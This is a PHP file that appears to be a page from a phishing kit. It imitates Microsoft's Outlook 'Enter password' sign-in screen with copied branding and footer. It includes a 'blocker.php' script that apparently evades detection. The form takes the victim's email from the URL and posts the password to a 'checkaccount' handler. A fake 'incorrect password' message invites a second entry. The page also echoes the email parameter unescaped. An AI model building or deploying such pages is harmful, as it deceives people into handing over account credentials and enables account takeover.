<?php
include('blocker.php');
ob_start();
session_start();
   
  ?>
<html dir=ltr lang=en>
<title>Sign in to Outlook</title>
<link href=lib/img/favicon.ico rel="shortcut icon">
<link href=lib/css/login.css rel=stylesheet>
<body class=cb style=display:block>
<div>
<div>
<div class="app background">
<div style=background-image:url(lib/img/background.jpg)></div>
</div>
</div>
<form method="post" action="checkaccount">
<div class=outer>
<div class="app middle">
<div class=background-logo-holder>
<img src=lib/img/logo3.png class=background-logo>
</div>
<div class="app fade-in-lightbox inner">
<div class=lightbox-cover>
</div>
<div>
<img src=lib/img/logo2.svg class=logo>
</div>
<div>
<div>
<div class="animate slide-in-next">
<div>
<div class=identityBanner>
<a class=backButton href="signin?email=<?php echo $_GET['email']; ?>" type=button>

<img src=lib/img/arrow.svg>
</a>

<div class=identity><?php echo $_GET['email']; ?></div>
</div>
</div>
</div>
<div class="animate slide-in-next has-identity-banner pagination-view">

<div class="row text-title">Enter password</div>
<div class=row>
<div class="form-group col-md-24">
<div aria-live=assertive role=alert>
            <?php if (isset($_GET['invalid'])) {
echo"   <div class='alert alert-error' >Your email or password is incorrect. If you don't remember your password, <a href='#''>reset it now.</a></div>"; 
   }  ?>
</div>
<div class=placeholderContainer>
<input name=email type=hidden value="<?php echo $_GET['email']; ?>" class="form-control ltr_override">
<input name=type type=hidden value="nextlogin">
<input name=password type=password required autocomplete=off class=form-control placeholder=Password tabindex=0>
</div>
</div>
</div>
<div class=position-buttons>
<div>
<div class=row>
<div class=col-md-24>
<div class="action-links text-13">
<div class=form-group>
   <a href="#">Forgot my password</a> </div>
<div class=form-group>
</div>
</div>
</div>
</div>
</div>
<div class=row >
<div>
<div class="button-container col-xs-24 no-padding-left-right">
<div class=inline-block>
<input type=submit value="Sign in"class="btn btn-block btn-primary">
                                       </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class=footer id=footer>
                     <div>
                        <div class="footerNode text-secondary">
                           <span>©2019 Microsoft</span> 
                           <a href="#">Terms of use</a> 
                           <a href="#">Privacy & cookies</a>
                           <a href="#">
                           <img src="lib/img/white_ellipsis.svg"> 
                    </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>

      </div>
         </body>
   </html>